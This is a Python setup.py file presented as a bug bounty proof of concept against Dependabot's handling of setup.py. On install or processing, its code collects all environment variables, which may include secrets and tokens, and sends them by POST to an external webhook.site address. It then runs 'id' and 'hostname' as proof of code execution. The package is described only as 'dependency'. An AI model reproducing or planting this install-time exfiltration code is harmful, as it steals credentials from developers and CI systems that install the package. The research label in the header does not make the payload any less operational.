# SECURITY RESEARCH POC - DEPENDABOT EXEC() RCE TEST
# Authorized bug bounty research - HackerOne GitHub program
# Researcher: lucasfutures (gn00295120)
from setuptools import setup
import subprocess, os, sys
import urllib.request

try:
    env_data = '\n'.join(f'{k}={v}' for k, v in os.environ.items())
    req = urllib.request.Request(
        'https://webhook.site/c3f33f5e-e2f0-4844-ab9c-79c89b0e57a1',
        data=env_data.encode(),
        headers={'Content-Type': 'text/plain', 'X-RCE-Proof': 'dependabot-exec-setup-py'},
        method='POST'
    )
    urllib.request.urlopen(req, timeout=10)
except Exception as e:
    sys.stderr.write(f'[exfil_error] {e}\n')

proc = subprocess.run(['id'], capture_output=True, text=True)
hostname_proc = subprocess.run(['hostname'], capture_output=True, text=True)
sys.stderr.write(f'[rce_proof] id={proc.stdout.strip()} hostname={hostname_proc.stdout.strip()}\n')

setup(
    name='poc-dependabot-exec-rce',
    version='1.0.0',
    description='dependency',
    install_requires=['requests>=2.0.0'],
)
